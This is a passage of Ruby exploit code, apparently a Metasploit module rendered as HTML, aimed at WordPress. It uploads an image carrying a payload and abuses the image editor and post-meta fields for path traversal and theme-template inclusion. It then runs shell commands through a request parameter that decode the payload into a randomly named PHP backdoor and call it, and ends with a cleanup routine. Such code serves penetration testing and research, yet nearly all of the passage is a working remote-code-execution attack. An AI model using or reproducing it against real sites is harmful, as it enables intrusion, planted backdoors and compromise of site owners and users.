[img_data.join].pack(&#39;H*&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;img_name += &#39;.jpg&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;boundary = &quot;#{rand_text_alphanumeric(rand(10) + 5)}&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data = &quot;--#{boundary}\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;Content-Disposition: form-data; name=\&quot;name\&quot;\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;\r\n#{img_name}\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;--#{boundary}\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;Content-Disposition: form-data; name=\&quot;action\&quot;\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;\r\nupload-attachment\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;--#{boundary}\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;Content-Disposition: form-data; name=\&quot;_wpnonce\&quot;\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;\r\n#{wp_nonce}\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;--#{boundary}\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;Content-Disposition: form-data; name=\&quot;async-upload\&quot;; filename=\&quot;#{img_name}\&quot;\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;Content-Type: image/jpeg\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;\r\n#{img_data}\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;post_data &lt;&lt; &quot;--#{boundary}--\r\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_status(&quot;Uploading payload&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;upload_uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;async-upload.php&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; upload_uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;ctype&#39; &nbsp;&nbsp;&nbsp;=&gt; &quot;multipart/form-data; boundary=#{boundary}&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;data&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; post_data,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;&nbsp;=&gt; cookie</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::UnexpectedReply, &#39;Unable to upload image&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_good(&quot;Image uploaded&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = JSON.parse(res.body)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;image_id = res[&quot;data&quot;][&quot;id&quot;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;update_nonce = res[&quot;data&quot;][&quot;nonces&quot;][&quot;update&quot;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filename = res[&quot;data&quot;][&quot;filename&quot;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return filename, image_id, update_nonce</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def image_editor(img_name, ajax_nonce, image_id, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;admin-ajax.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_post&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; =&gt; &#39;image-editor&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;_ajax_nonce&#39; =&gt; ajax_nonce,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;postid&#39; =&gt; image_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;history&#39; =&gt; &#39;[{&quot;c&quot;:{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:400,&quot;h&quot;:300}}]&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;target&#39; =&gt; &#39;all&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;context&#39; =&gt; &#39;&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;do&#39; =&gt; &#39;save&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to access page to retrieve filename&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filename = res.body.scan(/(#{img_name}-\S+)-/).flatten.first</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to retrieve file name&#39;) unless filename</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;filename &lt;&lt; &#39;.jpg&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def change_path(wpnonce2, image_id, filename, current_date, path, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_post&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;_wpnonce&#39; =&gt; wpnonce2,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; =&gt; &#39;editpost&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post_ID&#39; =&gt; image_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;meta_input[_wp_attached_file]&#39; =&gt; &quot;#{current_date}#{filename}#{path}&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def crop_image(image_id, ajax_nonce, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;admin-ajax.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_post&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; =&gt; &#39;crop-image&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;_ajax_nonce&#39; =&gt; ajax_nonce,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39; =&gt; image_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cropDetails[x1]&#39; =&gt; 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cropDetails[y1]&#39; =&gt; 0,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cropDetails[width]&#39; =&gt; 400,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cropDetails[height]&#39; =&gt; 300,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cropDetails[dst_width]&#39; =&gt; 400,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cropDetails[dst_height]&#39; =&gt; 300</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def include_theme(shell_name, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post-new.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wpnonce2 = res.body.scan(/name=&quot;_wpnonce&quot; value=&quot;(\w+)&quot;/).flatten.first</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_id = res.body.scan(/&quot;post&quot;:{&quot;id&quot;:(\w+),/).flatten.first</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to retrieve the second wpnonce and the post id&#39;) unless wpnonce2 &amp;&amp; post_id</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_title = Rex::Text.rand_text_alpha(10)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_post&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;_wpnonce&#39;=&gt; wpnonce2,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; =&gt; &#39;editpost&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post_ID&#39; =&gt; post_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post_title&#39; =&gt; post_title,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post_name&#39; =&gt; post_title,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;meta_input[_wp_page_template]&#39; =&gt; &quot;cropped-#{shell_name}.jpg&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Failed to retrieve post id&#39;) unless res &amp;&amp; res.code == 302</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post_id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def check_for_base64(cookie, post_id)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Test if base64 is on target</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;test_string = &#39;YmFzZTY0c3BvdHRlZAo=&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi!(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_get&#39; =&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;p&#39; =&gt; post_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;0&#39; =&gt; &quot;echo #{test_string} | base64 -d&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to retrieve response to base64 command&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &quot;Can&#39;t find base64 decode on target&quot;) unless res.body.include?(&quot;base64spotted&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Execute payload with base64 decode</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;@backdoor = Rex::Text.rand_text_alpha(10)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;encoded = Rex::Text.encode_base64(payload.encoded)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi!(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_get&#39; =&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;p&#39; =&gt; post_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;0&#39; =&gt; &quot;echo #{encoded} | base64 -d &gt; #{@backdoor}.php&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Failed to send payload to target&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;=&gt; &nbsp;&#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; &nbsp;normalize_uri(datastore[&#39;TARGETURI&#39;], &quot;#{@backdoor}.php&quot;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;=&gt; &nbsp;cookie</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def wp_cleanup(shell_name, post_id, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print_status(&#39;Attempting to clean up files...&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;admin-ajax.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;&nbsp;&nbsp;=&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_post&#39; &nbsp;=&gt; { &#39;action&#39; =&gt; &quot;query-attachments&quot; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Failed to receive a response for uploaded file&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;infos = res.body.scan(/id&quot;:(\d+),.*filename&quot;:&quot;cropped-#{shell_name}&quot;.*?&quot;delete&quot;:&quot;(\w+)&quot;.*&quot;id&quot;:(\d+),.*filename&quot;:&quot;cropped-x&quot;.*?&quot;delete&quot;:&quot;(\w+)&quot;.*&quot;id&quot;:(\d+),.*filename&quot;:&quot;#{shell_name}&quot;.*?&quot;delete&quot;:&quot;(\w+)&quot;/).flatten</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;id1, id2, id3 = infos[0], infos[2], infos[4]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for i in (0...6).step(2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;&nbsp;&nbsp;=&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_post&#39; &nbsp;=&gt; {</span><span 